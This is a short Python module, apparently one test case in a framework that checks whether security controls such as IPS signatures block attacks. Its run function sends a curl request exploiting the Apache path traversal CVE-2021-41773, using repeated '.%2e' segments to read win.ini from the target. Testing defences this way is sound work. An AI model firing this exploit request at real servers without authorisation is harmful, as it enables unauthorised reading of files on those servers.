"""CVE-2021-41773 — Apache path traversal (mod_cgi normalize-path bug).
Direct HTTP check (curl), matching the manual test script exactly: request
/cgi-bin/.%2e/.. x7 to escape docroot and read C:\\Windows\\win.ini."""
META = {
    "id": "apache_41773",
    "name": "Apache Path Traversal (CVE-2021-41773)",
    "category": "Server Exploitation",
    "control": "IPS signature / path normalization",
    "fix": "SD-WAN",
    "success_regex": r"fonts|extensions",
    "blocked_regex": r"timed out|Connection refused|403 Forbidden|could not resolve",
}

PATH = "/cgi-bin/" + "/".join([".%2e"] * 7) + "/windows/win.ini"


def run(target, ctx):
    return ctx.run_cmd(
        f'curl -s --path-as-is -m10 "http://{{target}}{PATH}"', target)
